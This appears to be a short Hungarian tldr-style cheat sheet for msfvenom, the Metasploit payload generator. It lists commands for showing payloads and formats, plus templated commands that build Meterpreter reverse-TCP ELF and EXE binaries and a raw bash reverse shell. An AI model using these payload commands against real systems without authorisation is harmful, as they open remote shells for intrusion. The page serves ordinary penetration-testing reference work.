# msfvenom

> Kézzel generál hasznos terheket a metasploit számára. További információ: <https://github.com/rapid7/metasploit-framework/wiki/How-to-use-msfvenom>.

- Listázza a hasznos terheket:

`msfvenom -l payloads`

- Formátumok listázása:

`msfvenom -l formats`

- Payload opciók megjelenítése:

`msfvenom -p {{payload}} --list-options`

- ELF bináris létrehozása fordított TCP kezelővel:

`msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f elf -o {{path/to/binary}}`

- EXE bináris létrehozása fordított TCP kezelővel:

`msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST={{local_ip}} LPORT={{local_port}} -f exe -o {{path/to/binary.exe}}`

- Nyers bash létrehozása fordított TCP kezelővel:

`msfvenom -p cmd/unix/reverse_bash LHOST={{local_ip}} LPORT={{local_port}} -f raw`
